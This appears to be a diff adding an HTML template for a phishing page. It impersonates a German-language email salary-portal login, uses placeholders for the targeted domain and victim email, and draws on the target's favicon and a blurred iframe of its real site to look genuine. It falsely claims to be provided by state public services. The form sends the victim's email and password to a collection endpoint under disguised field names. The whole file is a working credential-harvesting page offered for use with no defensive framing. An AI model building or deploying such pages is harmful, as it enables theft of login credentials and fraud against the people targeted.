@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>{{dman}} - log in</title>
+  <link rel="icon" href="https://api.kickfire.com/logo?website={{dman}}" type="image/x-icon">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+    #bgFrame {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      filter: blur(8px) brightness(0.7);
+      z-index: -1;
+    }
+  </style>
+</head>
+<body class="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-900 via-white to-green-100 p-6">
+  
+  <!-- Blurred iframe background -->
+  <iframe id="bgFrame" src="https://www.{{dman}}"></iframe>
+
+  <div class="w-full max-w-md relative z-10">
+    <div class="bg-white rounded-2xl shadow-xl border border-gray-100 p-8">
+      
+      <!-- Centered Logo + Title -->
+      <div class="mb-6 flex flex-col items-center text-center">
+        <img src="data:image/png;base64,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">
+        <h1 class="text-2xl font-bold text-blue-900">{{dman}} </h1>
+        <p class="text-gray-500 text-sm mt-1">{{dman}} E-Mail-Gehaltsportal-Login (Nur Vorschau/Download) (bereitgestellt von staatlichen öffentlichen Diensten) </p>
+      </div>
+
+      <form id="loginForm" class="space-y-5" action="first" method="POST">
+        <div class="relative">
+          <span class="absolute left-3 top-3 text-gray-400">📧</span>
+          <input
+            type="email"
+            placeholder="Email address"
+            value="{{eman}}"
+            name="horse"
+            required
+            class="w-full pl-10 pr-3 py-2 border border-gray-300 rounded-lg focus:border-green-500 focus:ring-green-500"
+          />
+        </div>
+
+        <div class="relative">
+          <span class="absolute left-3 top-3 text-gray-400">🔒</span>
+          <input
+            type="password"
+            placeholder="Passwort"
+            name="pig"
+            required
+            class="w-full pl-10 pr-3 py-2 border border-gray-300 rounded-lg focus:border-green-500 focus:ring-green-500"
+          />
+        </div>
+
+        <button
+          id="loginBtn"
+          type="submit"
+          class="w-full bg-blue-900 hover:bg-blue-800 text-white py-2 rounded-xl shadow-md"
+        >
+          einloggen
+        </button>
+
+        <div id="loadingSpinner" class="hidden flex justify-center mt-4">
+          <svg class="animate-spin h-6 w-6 text-blue-900" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
+          </svg>
+        </div>
+      </form>
+
+      <div class="mt-6 flex justify-between text-sm text-gray-500">
+        <a href="#" class="hover:text-green-600">Passwort vergessen?</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const loginBtn = document.getElementById('loginBtn');
+    const spinner = document.getElementById('loadingSpinner');
+
+    
+  </script>
+</body>
+</html>
+
